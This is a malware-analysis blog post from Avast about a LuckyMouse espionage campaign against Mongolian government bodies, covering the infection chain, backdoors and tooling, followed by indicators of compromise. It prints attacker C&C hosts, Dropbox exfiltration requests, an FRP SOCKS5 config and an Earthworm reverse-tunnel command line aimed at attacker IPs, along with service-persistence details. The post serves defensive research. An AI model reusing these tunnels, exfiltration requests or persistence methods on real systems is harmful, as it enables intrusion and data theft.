style="--container-size:var(--container-size-xxl);max-width:calc(97.5rem * var(--mantine-scale));padding-inline:0rem" class="m_7485cace mantine-Container-root" data-size="xxl" id="post" data-component="post-content"><div class="RichText_wrapper__xZRh7"><p><strong>Introduction&nbsp;</strong></p><p>This summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.&nbsp;</p><p>The APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.</p><p>According to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.&nbsp;</p><p>There are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.&nbsp;</p><p><strong>Attribution &amp; Clusterization</strong></p><p>We base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>][<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>In 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (<em>IntgStat.exe</em>). This is a legitimate application that loads a DLL <em>pcalocalresloader.dll</em>. By sideloading their own version <em>pcalocalresloader.dll</em>, they load HyperBro RAT from a compressed and encrypted file<em> thumbs.db</em>. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/">2</a>].</p><p>In April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application <em>thinprobe.exe</em> that loads <em>thinhostprobedll.dll</em>. This DLL was then used to sideload <em>thumb.db</em> that contained encrypted and compressed HyperBro[<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">3</a>].</p><p>We’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.</p><p><strong>Infection Chain</strong></p><p>We observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked company’s email accounts to the government officials. While we were unable to recover the whole email, we’ve managed to recover the email’s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.</p><p>Date: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)&nbsp;<br>Subject: Re: Perform a firmware update on the server</p><p>XXXXXX_update.exe&nbsp;</p><p>(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)</p><p>This archive drops three already familiar files – Symantec’s <em>thinprobe.exe</em>, malicious <em>thinhostprobedll.dll</em>, and <em>thumb.db</em>. The malicious DLL is used for DLL sideloading, decrypting and decompressing <em>thumb.db</em> and finally loading its processed content – a HyperBro RAT . This backdoor has also been reported on by <a href="https://securelist.com/luckymouse-hits-national-data-center/86083/">Kaspersky[1]</a> and <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">PaloAlto Networks[3]</a>, the latter providing an extensive description of the HyperBro RAT.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root"><picture id="the-picture"><source srcSet="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Fgraph_dark.png.webp%3Fitok%3DxZKkQ35x&amp;w=384&amp;q=75 class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 1: Overview of infection vector</p></div><div class="RichText_wrapper__xZRh7"><p><strong>Toolset</strong></p><p>In this following section we describe a tool set we found on the victim’s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:</p><ul><li>Helpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector</li><li>Remote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo</li><li>Publicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler</li></ul><p>In detail, we found the following tools:</p><h2><strong>StartServiceTool</strong></h2><p>This tool installs <em>wcm.dll</em> into <em>%WINDIR%\system32</em>, a registry record</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsConnections Manager</p><p>is created with the following values:</p><p>Description: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.</p><p>DisplayName: Windows Connections Manager</p><p>ServiceDll: C:\Windows\system32\wcm.dll.</p><p>This effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts – embedded DLL, and mmLoader (<a href="http://tishion.github.io/mmLoader/">http://tishion.github.io/mmLoader/</a>), a loader that bypasses the windows loader.</p><p>The final payload DLL is written in GO and contains a single export named “Interface“. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.<br>The hardcoded decryption key is “0000111122223333“. The DLL additionally contains a default API key which appears to be for the authors test account.</p><p>Initially, it tries do download a file from Dropbox via the HTTP API:</p><p>POST /2/files/download HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 0<br>Authorization: Bearer [snipped]<br>Dropbox-Api-Arg: {“path”: “/infos/000000.txt”}<br>Accept-Encoding: gzip</p><p>If the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:</p><p>POST /2/files/upload HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 36<br>Authorization: Bearer [snipped]<br>Content-Type: application/octet-stream<br>Dropbox-Api-Arg: {“path”: “/infos/116a0d.txt”,”mode”: “overwrite”,”autorename”: true,”mute”: false,”strict_conflict”: false}<br>Accept-Encoding: gzip</p><p>%currentDate% %currentTime%##%hostname%</p><p>Afterwards, a C&amp;C request-response loop is started. Based on the response from the C&amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind that all download/upload are using the aforementioned Dropbox API:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200_20.png.webp?itok=6c767pnB 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200_20.png.webp?itok=pipbVt-N 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/pasted%20image%200_20.png.webp?itok=vhd3NbWi 1x, class="RichText_wrapper__xZRh7"><p>At first, security descriptors of both <em>%windir%\system32\ </em>and <em>%windir%\system32\drivers\ </em>changes to allow the current user to copy files to these locations. Then the installer copies a service executable to <em>%windir%\system32\</em> under a randomly generated name (4 alphanumeric characters).</p><p>Depending on whether a service named <em>DFS Replication</em> already exists in&nbsp;</p><p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost netsvcs,</p><p>a new service called <em>DFS Replication </em>(if it does not exist) or <em>IAS Jet Database Access Service %number%</em> is created. More specifically, its parameters are:</p><p>Description: <em>“Configures Internet Authentication Service (IAS). If this service is stopped, the remote network access that requires user authentication will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start or (Retail) Replicates files among multiple PCs keeping them in sync. On Client, it is used to roam folders between PCs; on the server, it is used to provide high availability and local access across a wide area network (WAN). If the service is stopped, file replication does not occur, and the files on the server become out-of-date. If the service is disabled, any services that explicitly depend on it will not start.”</em><br>DisplayName: DFS Replication/IAS Jet Database Access Service %number%<br>ServiceDll: C:\Windows\system32\&lt;4 random alphanumeric characters&gt;.dll.<br>Tag: 0<br>Security: 0</p><h2><strong>ShellCodeExecutor</strong></h2><p>This utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking can be seen below:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro memory</p></div><div class="RichText_wrapper__xZRh7"><p>While we weren’t able to reconstruct which stage this executor was used, we were able to recover its parameter that corresponds to a hex-encoded metasploit-generated shellcode (reverse HTTP proxy – <a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_https_proxy.asm">Github</a> configured to connect to URL <em>oss.chrome-upgrade[.]com</em> (202.59.9[.]58). We suspect that the threat actors used the shellcode just to retrieve and execute a further stage from the C&amp;C server.</p><h2><strong>DataExtractor 1</strong></h2><p>This tool can be used to gather potentially sensitive documents with <em>pdf</em>,<em> ppt</em>,<em> xls</em>, and <em>doc</em> file extensions. It recursively scans all connected drives for such documents that were modified in 2020 and later. Gathered documents are packed using Winrar and the archive is protected with a password <em>“zaq1xsw@cde3</em>”. This archive will be then saved to <em>C:\MSBuild\NVIDIA\ </em>under a filename <em>CRYPTO-%computerName%-%number_value%.SYS</em>. This scan is repeated every 20 minutes. If this tool is launched a second time (e.g. after reboot), only documents that were modified in the last 24 hours are gathered.</p><p>After each run, a file <em>%windir%\system32\igfxme.vbs </em>is executed. Since this tool did not contain any exfiltration-related functionality, we presume that this script is used to exfiltrate the archive from the computer to a C&amp;C. Unfortunately, we were not able to recover this script.</p><h2><strong>DataExtractor 2</strong></h2><p>This binary is a simple filescanner that is provided with a list of file extensions, a list of directories, and date boundaries as parameters. Every directory from the list is searched for files with a given file extension. If such files are found and their modification date is within the provided date boundaries (in UTC), their full paths are written down into the output file. These paths are delimited by Windows line delimiters and they are encoded in 16-bit Unicode.</p><p>Below you will see a part of an error message, providing us the information about how this utility is used:</p><p><em>T040ClientLite.exe suffix .txt,.xls scanDirs E:\\test,E:\\test1 output E:\\test\\output.txt startEditDate 2020/04/26 endEditDate 2020/04/27</em></p><p>More generally, the command’s format is:</p><p><em>T040ClientLite.exe suffix &lt;file extensions&gt; scanDirs &lt;directories&gt; output &lt;output file&gt; startEditDate &lt;date&gt; endEditDate &lt;date&gt;</em></p><h2><strong>Information Collector</strong></h2><p>The Information Collector focuses on removable drives. If no such drives are connected, its execution is terminated. The collector fingerprints those drives (serial number, vendor ID, product ID), encrypts this data with a 64 byte XOR key, and stores it onto the system drive as hidden files. More specifically, it uses the following directories:</p><p><em>C:\MSBuild\Resources\Format\S-1-1</em> (encrypted files)</p><p><em>C:\MSBuild\Resources\Format\S-1-0\S-1-0-0 (unencrypted temporary files, deleted after encryption)</em></p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root"><picture id="the-picture"><source https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-2_5.png.webp?itok=UB-PKObF 2x" media="(min-width: 1020px)"/><source class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 4: Sample enumerate drives, checking their type with GetDriveTypeA</p></div><div class="RichText_wrapper__xZRh7"><p><em>It ensures its persistence by adding itself into Run (SOFTWARE\Microsoft\Windows\CurrentVersion\Run) registry key under AvpSecurity.</em></p><p>Interestingly, it contains many unused functions using command-line tools such as: systeminfo, arp, ipconfig, netstat, and tasklist. It also supports archiving the collected information using WinRAR with a hard-coded password “1qaz@WSX”. The sample has no networking capabilities. It primarily serves for collecting the information and transferring the gathered information using removable drives between the machines in the network.</p><p>Moreover, the particular sample we analyzed contained a bug in the drives’ enumeration routine that made it virtually useless as it hampered all the sample’s functionality.</p><h2><strong>RAT</strong></h2><h3><strong>Korplug (PlugX)</strong></h3><p>Korplug (PlugX) is a well-known Remote Access Trojan associated with Chinese speaking attackers and it has been used in a large number of targeted attacks since 2012[<a href="https://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacks-afghanistan-tajikistan/">4</a>]. It uses DLL side-loading to load itself into the memory through legitimate applications. It helps it stay unnoticed by any security product. Korplug is a fully featured RAT, with capabilities such as file uploads, downloads, keystroke logging, webcam control and access to a remote cmd.exe shell.&nbsp;</p><p>In our case, we observed that it was loaded through an application provided by ESET called unsecapp.exe that was signed with a valid, but expired certification. After executing unsecapp.exe, it loads a malicious DLL <em>http_dll.dll</em>. This DLL, in turn, decrypts <em>http_dll.dat</em> with a custom algorithm, yielding Korplug which is then loaded into the memory and executed. Unfortunately, we were not able to trace the RAT back to the original payload that dropped and executed these files.</p><p>Address of C&amp;C servers:&nbsp;</p><p>web[.]microlynconline[.]com:80<br>home[.]microlynconline[.]com:8000<br>help[.]microlynconline[.]com:443<br>host[.]microlynconline[.]com:53</p><h2><strong>Backdoors</strong></h2><p>We found three different backdoors in the government office network, two of which, PolPo and LuckyBack, were never seen in any previous campaign. Polpo also hits the National Data Center, and the two others, BlueTraveller and LuckyBack, only hit the government office network.</p><h3><strong>LuckyBack</strong></h3><p>LuckyBack collects the computer’s fingerprint, at first, and then tries to establish a communication with the C&amp;C server (45.77.55[.]145). Once the communication is established, the backdoor starts listening for commands. It is capable of: starting a remote shell, file manipulation (move, read, write, execute, get file size), keylogging, and screen capturing.</p><h4><strong>Technical:</strong></h4><p>At first, the used code page is retrieved by calling <em>chcp</em>, a command providing the keyboard and character set information, on the system drive.</p><p>The first request on the C&amp;C server “registers” the device by providing its fingerprint. Namely, the fingerprint is constructed from: PID, Windows version/build number, CPU architecture, username, user privileges, hostname, IP address, code page, and RDP session ID.</p><p>If the server accepts the registration, it responds with the PID and a simple string “OK”. Afterwards, a simple request-response C&amp;C loop is started, and commands and their corresponding numbers are displayed in the table below:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root"><picture 1x, /blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.16.12%25E2%2580%25AFAM.png.webp%3Fitok%3DnDreIZHV&amp;w=640&amp;q=75 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FScreenshot%25202024-06-24%2520at%252011.16.12%25E2%2580%25AFAM.png.webp%3Fitok%3DnDreIZHV&amp;w=640&amp;q=75"/></picture></div><div class="RichText_wrapper__xZRh7"><h3><strong>BlueTraveller</strong></h3><p>This backdoor is simpler in terms of commands than the previous one. It accepts just four commands: exit, upload, download, and execute on the command line. Nevertheless, it uses two layers of C&amp;C servers, meaning that the first request is on the first layer, and it yields an IP address of a C&amp;C server from the second layer. Afterwards, the request-response C&amp;C loop uses the second layer. If the backdoor receives a command for the command line, the output from the console is encrypted with AES-256 and sent back to the second-layer C&amp;C server.</p><p>The binary itself has its strings encrypted with RC4, using a hardcoded key “L!Q@W#E$R%T^Y&amp;U*A|}t~k”. Among these strings, we may find the address of the first-layer C&amp;C server and the user agent that should be used for these requests. Our sample tried to contact <a href="https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/blank">http://go.vegispaceshop[.]org/shop.htm</a>. The response seems to be pretty inconspicuous at first glance. But once we have a look more closely, we see that many lines are followed by a mixture of tabs and spaces,which is rather fishy indeed. And surprisingly this is where the IP address of the second C&amp;C layer hides!</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/pasted%20image%200-3_3.png.webp?itok=YbDlWU-q 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/pasted%20image%200-3_3.png.webp?itok=gY262O1B 2x" media="(min-width: 1020px)"/><source 6: Script which decrypts the white spaces from the html response" width="300" height="300" decoding="async" data-nimg="1" class="imageWithCaption_image__xW70R" 1x, /blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Fpasted%2520image%25200-4_0.png.webp%3Fitok%3DqcYJdIDI&amp;w=640&amp;q=75 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Fpasted%2520image%25200-4_0.png.webp%3Fitok%3DqcYJdIDI&amp;w=640&amp;q=75"/></picture><p class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 6: Script which decrypts the white spaces from the html response</p></div><div class="RichText_wrapper__xZRh7"><p>The BlueTraveller uses the same scheme for encryption – AES-256 with a key derived from a string that is hashed with SHA-256, providing the IV and the key. The first usage of this encryption is in the first request to the second-layer C&amp;C. For this first request, the key is derived from a string “<em>0304276cf4f31345“</em>. The key is then used to encrypt the generated GUID and the computer’s hostname which are then Base64-encoded and used to generate the request URL:&nbsp;&nbsp;</p><p><em>http://&lt;second_layer_C&amp;C&gt;/home/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</em></p><p>After this request is executed, commands are retrieved from:</p><p><em>http://&lt;second_layer_C&amp;C&gt;/index.htm.</em></p><p>The obtained data is encrypted with AES-256, using the aforementioned approach with GUID as a base-string for the key-derivation procedure. Each response also contains the random number that was sent in the first second-layer request. The malware checks whether the received number matches the one it sent; in case of a mismatch, the command is discarded. If a command for the command line is received, the output of the executed command (AES-256 encrypted, using the same key as the previous response, and Base64 encoded) is sent to</p><p>http://&lt;second_layer_C&amp;C&gt;/help/&lt;rand number&gt;/&lt;enc_length&gt;/&lt;Base64 data&gt;.</p><h3><strong>Polpo</strong></h3><p>Polpo is a backdoor that we’ve been seeing in the wild since 2018. It supports around 15 different commands including information collection and exfiltration, file transfer, and proxy connections.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root"><picture to blend with the normal traffic. Functionality</strong></h4><p>There are more than 15 commands supported by the backdoor, although some of them are duplicates. Most of the commands are executed in separate threads. Errors and inter-thread communication are handled using Events.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro class="RichText_wrapper__xZRh7"><h2><strong>UAC bypass tool</strong></h2><p>An open-source UAC bypass tool (<a href="https://github.com/vestjoe/WinPwnage#uac-bypass-techniques">https://github.com/vestjoe/WinPwnage</a>) was detected on several compromised devices. It may be used to elevate privileges or achieve persistence on the system. We presume that it was used to execute tasks and programs under administrator-level permissions.&nbsp;</p><h2><strong>Port-scanners</strong></h2><p>Several different port scanners were seen on compromised devices under various filenames. One of the used port scanners was open-source <a href="https://github.com/kingron/s">https://github.com/kingron/s</a>. We assume that in this case it was used for scanning the ports of the server to find out which services were running.</p><h2><strong>Nbtscan</strong></h2><p>Nbtscan is a command-line NetBIOS scanner for Windows that scans for open NetBIOS name servers in the network.</p><h2><strong>Passwords dumpers</strong></h2><p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> and <a href="https://github.com/AlessandroZ/LaZagne">Lazagne</a> were seen on the infected computers. We presume that they were used to retrieve credentials from the compromised computers. We’ve also spotted a wrapped Mimikatz version, download from <a href="https://github.com/jas502n/mimikat_ssp">https://github.com/jas502n/mimikat_ssp</a>, on several compromised devices.</p><h2><strong>FRP</strong></h2><p>Fast Reverse Proxy (FRP) is a tool that allows you to expose local services that are hidden behind the NAT or a firewall to the internet. Both the raw TCP and UDP are supported as well as several other protocols whose requests can be forwarded to the internal services via this proxy. We’ve recovered a configuration file <em>3bef4cd.tmp</em> for this proxy. The content of this proxy is the following:</p><p>[common]<br>server_addr = 202.59.9[.]58<br>server_port = 8443<br>privilege_token = %token%<br>[SDJY_proxy]<br>type = tcp<br>remote_port = 6001<br>plugin = socks5</p><p>It is immediately obvious that the actor used the SOCKS5 plugin to route requests to the compromised network via 202.59.9[.]58:8443.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/FRP_graph.png.webp?itok=FlbsrLM4 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large_2x/public/2024-06/FRP_graph.png.webp?itok=u929aPYO 2x" media="(min-width: 1020px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium/public/2024-06/FRP_graph.png.webp?itok=RRBnM_h8 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_medium_2x/public/2024-06/FRP_graph.png.webp?itok=krp3kRkN 2x" media="(min-width: 720px)"/><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small/public/2024-06/FRP_graph.png.webp?itok=pdFuuMia 1x, https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_small_2x/public/2024-06/FRP_graph.png.webp?itok=rrfPYi2N 2x" media="(min-width: 420px)"/><img alt="Figure 10: Diagram of FRP tool usage" width="300" height="300" decoding="async" data-nimg="1" class="imageWithCaption_image__xW70R" style="color:transparent;width:100%;height:100%" srcSet="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FFRP_graph.png.webp%3Fitok%3DpdFuuMia&amp;w=384&amp;q=75 1x, /blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FFRP_graph.png.webp%3Fitok%3DpdFuuMia&amp;w=640&amp;q=75 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2FFRP_graph.png.webp%3Fitok%3DpdFuuMia&amp;w=640&amp;q=75"/></picture><p class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Figure 10: Diagram of FRP tool usage</p></div><div class="RichText_wrapper__xZRh7"><h2><strong>Earthworm tunneler</strong></h2><p>The Earthworm tunneler is considered to be a typical tool for Chinese-speaking actors by Kaspersky[1]. We’ve seen this tool on all compromised systems of national data center. On one of these devices, we’ve managed to recover command-line parameters that were used:&nbsp; <em>-s rssocks -d 139.180.155.133 -e 80</em>. The tool itself creates a SOCKS tunnel to the provided server. It is publically available at <a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a>.</p><h2><strong>Conclusions</strong></h2><p>As this blogpost demonstrates, LuckyMouse has used new methods to infiltrate the government institution through a third party’s system which they attacked.&nbsp;</p><p>Avast has recently protected users in the government institution and national data center from further attacks using the samples we analyzed. We also discovered an interesting encryption method that delivers a hidden IP address in the whitespace of the C&amp;C response. We presume that the attackers updated their attacking toolset in this campaign after it was discovered by Avast.</p><p>I would like to thank Adolf Středa, David Zimmer and Anh Ho for helping me with this research.</p><h2><strong>Indicators of Compromise (IoC)</strong></h2><ul><li>&nbsp;Repository:&nbsp;<a href="https://github.com/avast/ioc/tree/master/LuckyMouse">https://github.com/avast/ioc/tree/master/</a></li><li> List of SHA-256:&nbsp;<a href="https://github.com/avast/ioc/blob/master/LuckyMouse/samples.sha256">https://github.com/avast/ioc/blob/master/</a></li></ul><h2><strong>MITRE ATT&amp;CK techniques</strong></h2></div><div summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThe APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.\u003c/p\u003e\u003cp\u003eAccording to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment – a weaponized document using CVE-2017-11882.\u0026nbsp;\u003c/p\u003e\u003cp\u003eThere are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eAttribution \u0026amp; Clusterization\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e][\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (\u003cem\u003eIntgStat.exe\u003c/em\u003e). This is a legitimate application that loads a DLL \u003cem\u003epcalocalresloader.dll\u003c/em\u003e. By sideloading their own version \u003cem\u003epcalocalresloader.dll\u003c/em\u003e, they load HyperBro RAT from a compressed and encrypted file\u003cem\u003e thumbs.db\u003c/em\u003e. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[\u003ca href=\"https://securelist.com/luckymouse-hits-national-data-center/86083/\"\u003e1\u003c/a\u003e][\u003ca href=\"https://securelist.com/luckymouse-ndisproxy-driver/87914/\"\u003e2\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eIn April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application \u003cem\u003ethinprobe.exe\u003c/em\u003e that loads \u003cem\u003ethinhostprobedll.dll\u003c/em\u003e. This DLL was then used to sideload \u003cem\u003ethumb.db\u003c/em\u003e that contained encrypted and compressed HyperBro[\u003ca href=\"https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/\"\u003e3\u003c/a\u003e].\u003c/p\u003e\u003cp\u003eWe’ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouse’s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eInfection Chain\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eWe observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the company’s computers and managed to harvest credentials belonging to the company’s email accounts. Unfortunately, we haven’t been able to identify which attack vector was used in this infiltration. These credentials were 